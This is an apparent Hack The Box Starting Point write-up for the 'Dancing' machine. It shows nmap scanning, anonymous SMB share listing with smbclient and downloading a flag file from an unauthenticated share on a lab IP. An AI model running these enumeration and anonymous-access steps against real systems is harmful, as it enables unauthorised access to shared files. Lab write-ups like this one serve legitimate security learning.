## 💃 HTB Starting Point: Dancing  
**Level**: Easy  
**Date**: July 12, 2025  
**Goal**: Enumerate and exploit an open SMB service to retrieve the user flag.

---

### 🧰 Tools  
- `nmap`  
- `smbclient`  
- Basic Linux commands (`ls`, `get`, `cat`)  

---

### 🧭 Steps  

1. 🔎 **Scan the target with `nmap`** to identify SMB ports and service versions:
   ```bash
   nmap -sC -sV -Pn -n -T4 10.129.X.X
   ```

---

### Output
```
PORT    STATE SERVICE       VERSION
445/tcp open  microsoft-ds  Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
```

---

2. 📂 **Enumerate SMB shares anonymously**:
   ```bash
   smbclient -L \\10.129.X.X\\ -N
   ```

   Example output:
   ```
   Sharename       Type      Comment
   ---------       ----      -------
   WorkShares      Disk      Company Shared Drive
   ```

---

3. 📁 **Access the share and download the flag**:
   ```bash
   smbclient \\10.129.X.X\WorkShares -N
   ```

   Inside the SMB shell:
   ```bash
   ls
   get flag.txt
   exit
   ```

---

4. 📖 **Read the flag locally**:
   ```bash
   cat flag.txt
   # HTB{REDACTED}
   ```

---

### 💣 Payloads Used  
```bash
nmap -sC -sV -Pn -n -T4 10.129.X.X
smbclient -L \\10.129.X.X\\ -N
smbclient \\10.129.X.X\WorkShares -N
ls
get flag.txt
cat flag.txt
```
